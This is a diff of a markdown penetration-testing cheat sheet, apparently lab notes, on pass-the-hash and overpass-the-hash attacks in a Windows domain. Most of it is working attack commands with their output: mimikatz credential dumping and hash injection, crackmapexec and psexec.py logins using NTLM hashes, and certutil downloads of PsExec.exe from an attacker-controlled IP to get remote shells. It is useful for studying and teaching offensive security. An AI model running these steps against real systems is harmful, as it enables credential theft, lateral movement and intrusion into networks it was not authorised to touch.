@@ -1749,15 +1749,19 @@ crackmapexec smb 10.11.1.20-24 -u tris -H 08df3c73ded940e1f2bcf5eea4b8dbf6 -d sv
 psexec.py tris@10.11.1.20 -hashes 08df3c73ded940e1f2bcf5eea4b8dbf6:08df3c73ded940e1f2bcf5eea4b8dbf6
 ````
 #### Overpass the Hash <img src="https://cdn-icons-png.flaticon.com/128/9513/9513588.png" width="40" height="40" /> <img src="https://cdn-icons-png.flaticon.com/128/5584/5584500.png" width="40" height="40" /> 
+##### Intro
 With overpass the hash,1 we can "over" abuse a NTLM user hash to gain a full Kerberos Ticket Granting Ticket (TGT) or service ticket, which grants us access to another machine or service as that user.
+##### Pre-req
 ````
 In this technique we have to first get system access and follow the adding a user with high privs guides!
 Once the that guide in our cheat sheet is done come back to this. We are going from .24 to .21 in this guide
 ````
+##### Exploitation mimikatz
 ````
 privilege::debug
 sekurlsa::logonpasswords
 ````
+###### Results
 ````
 Authentication Id : 0 ; 1822926 (00000000:001bd0ce)
 Session           : NewCredentials from 0
@@ -1783,13 +1787,16 @@ SID               : S-1-5-18
         ssp :
         credman :
 ````
+##### Exploitation
 ````
 sekurlsa::pth /user:pete /domain:svcorp.com /ntlm:0f951bc4fdc5dfcd148161420b9c6207 /run:PowerShell.exe
 #this should spawn a new shell
 ````
+##### Checking for lateral movement
 ````
 crackmapexec smb 10.11.1.20-24 -u pete -H 0f951bc4fdc5dfcd148161420b9c6207 -d svcorp.com -x whoami
 ````
+###### Results
 ````
 crackmapexec smb 10.11.1.20-24 -u pete -H 0f951bc4fdc5dfcd148161420b9c6207 -d svcorp.com -x whoami
 SMB         10.11.1.21      445    SV-FILE01        [*] Windows Server 2016 Standard 14393 x64 (name:SV-FILE01) (domain:svcorp.com) (signing:False) (SMBv1:True)
@@ -1803,12 +1810,15 @@ SMB         10.11.1.21      445    SV-FILE01        [+] Executed command
 SMB         10.11.1.21      445    SV-FILE01        svcorp\pete
 SMB         10.11.1.20      445    SV-DC01          [+] svcorp.com\pete:0f951bc4fdc5dfcd148161420b9c6207
 ````
+##### Moving to next target
 ````
 PS> klist # should show no TGT/TGS
 PS> net use \\SV-FILE01 (try other comps/targets) # generate TGT by authN to network share on the computer
 PS> klist # now should show TGT/TGS
 PS> certutil -urlcache -split -f http://192.168.119.140:80/PsExec.exe #/usr/share/windows-resources
 PS>  .\PsExec.exe \\SV-FILE01 cmd.exe
+````
+###### Results
 ````
 PsExec v2.2 - Execute processes remotely
 Copyright (C) 2001-2016 Mark Russinovich
@@ -1839,34 +1849,6 @@ C:\Windows\system32>whoami
 svcorp\pete
 
 C:\Windows\system32>
-````
-````
-net group "domain controllers" /domain
-The request will be processed at a domain controller for domain exam.com.
-
-Group name     Domain Controllers
-Comment        All domain controllers in the domain
-
-Members
-
--------------------------------------------------------------------------------
-DC02$                    
-The command completed successfully.
-````
-````
-net use \\dc02.exam.com
-````
-We have now converted our NTLM hash into a Kerberos TGT, allowing us to use any tools that rely on Kerberos authentication (as opposed to NTLM) such as the official PsExec application from Microsoft. PsExec can run a command remotely but does not accept password hashes. Since we have generated Kerberos tickets and operate in the context of Jeff_Admin in the PowerShell session, we may reuse the TGT to obtain code execution on the domain controller.
-
-Let's try that now, running ./PsExec.exe to launch cmd.exe remotely on the \dc01 machine as Jeff_Admin:
-````
-https://github.com/EliteLoser/Invoke-PsExec/blob/master/PsExec.exe
-cp /home/kali/Downloads/PsExec.exe .
-python3 -m http.server 800
-certutil -urlcache -split -f http://192.168.119.183:800/PsExec.exe
-````
-````
-.\PsExec.exe \\dc02.exam.com cmd.exe
 ````
 
 #### Pass the Ticket <img src="https://cdn-icons-png.flaticon.com/128/6009/6009553.png" width="40" height="40" /> <img src="https://cdn-icons-png.flaticon.com/128/3851/3851423.png" width="40" height="40" />
